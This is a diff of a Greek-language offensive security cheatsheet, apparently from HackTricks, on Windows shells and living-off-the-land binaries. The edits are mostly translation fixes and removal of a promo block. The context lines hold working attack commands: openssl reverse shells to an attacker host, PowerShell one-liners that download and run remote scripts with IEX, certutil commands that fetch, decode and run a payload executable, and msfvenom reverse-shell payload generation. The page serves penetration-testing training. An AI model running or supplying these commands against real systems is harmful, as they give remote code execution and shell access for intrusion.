@@ -15,17 +15,9 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Lolbas
 
-Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για Windows όπως [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για linux.\
+Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για Windows όπως η [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για linux.\
 Προφανώς, **δεν υπάρχουν SUID αρχεία ή sudo δικαιώματα στα Windows**, αλλά είναι χρήσιμο να γνωρίζουμε **πώς** ορισμένα **binaries** μπορούν να (κατα)χρησιμοποιηθούν για να εκτελέσουν κάποιες απροσδόκητες ενέργειες όπως **η εκτέλεση αυθαίρετου κώδικα.**
 
 ## NC
@@ -94,15 +86,15 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 #Windows
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
-## Powershell
+## PowerShell
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Process performing network call: **powershell.exe**\
-Payload written on disk: **ΟΧΙ** (_τουλάχιστον πουθενά δεν μπόρεσα να βρω χρησιμοποιώντας το procmon !_ )
+Διαδικασία που εκτελεί κλήση δικτύου: **powershell.exe**\
+Payload που γράφτηκε στον δίσκο: **ΟΧΙ** (_τουλάχιστον πουθενά δεν μπόρεσα να βρω χρησιμοποιώντας το procmon !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -286,7 +278,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Ανιχνεύθηκε από τον αμυντικό**
+**Ανιχνεύθηκε από τον αμυντικό μηχανισμό**
 
 
 ## **Cscript/Wscript**
@@ -304,7 +296,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
+Payload written on disk: **Τοπική μνήμη cache πελάτη WebDAV**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -483,12 +475,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS κονσόλα με μερ�
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-​
-**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
